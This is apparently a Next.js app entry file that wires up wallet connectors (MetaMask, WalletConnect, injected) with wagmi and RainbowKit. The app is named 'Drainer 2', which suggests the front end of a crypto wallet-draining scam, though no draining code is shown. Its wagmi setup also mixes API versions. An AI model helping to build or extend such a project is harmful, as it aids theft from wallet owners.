import { AppProps } from 'next/app';
import { WagmiConfig, createConfig } from 'wagmi';
import { RainbowKitProvider, darkTheme, connectorsForWallets } from '@rainbow-me/rainbowkit';
import { mainnet, polygon } from 'wagmi/chains';
import { injectedWallet, metaMaskWallet, walletConnectWallet } from '@rainbow-me/rainbowkit/wallets';

// Récupération du projectId avec une vérification
const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID;
if (!projectId) {
  throw new Error('NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID est manquant dans les variables d’environnement.');
}

// Configuration des connecteurs WalletConnect, MetaMask et Injected Wallet
const connectors = connectorsForWallets([
  {
    groupName: 'Recommandé',
    wallets: [
      injectedWallet({ projectId }),
      metaMaskWallet({ projectId }),
      walletConnectWallet({ projectId }),
    ],
  },
], {
  appName: 'Drainer 2',
  projectId,
});

// Configuration de Wagmi avec des transports valides
const config = createConfig({
  autoConnect: true,
  connectors,
  transports: {
    [mainnet.id]: { http: mainnet.rpcUrls.default.http[0] },
    [polygon.id]: { http: polygon.rpcUrls.default.http[0] },
  },
});

function MyApp({ Component, pageProps }: AppProps) {
  return (
    <WagmiConfig config={config}>
      <RainbowKitProvider theme={darkTheme()} modalSize="compact">
        <Component {...pageProps} />
      </RainbowKitProvider>
    </WagmiConfig>
  );
}

export default MyApp;
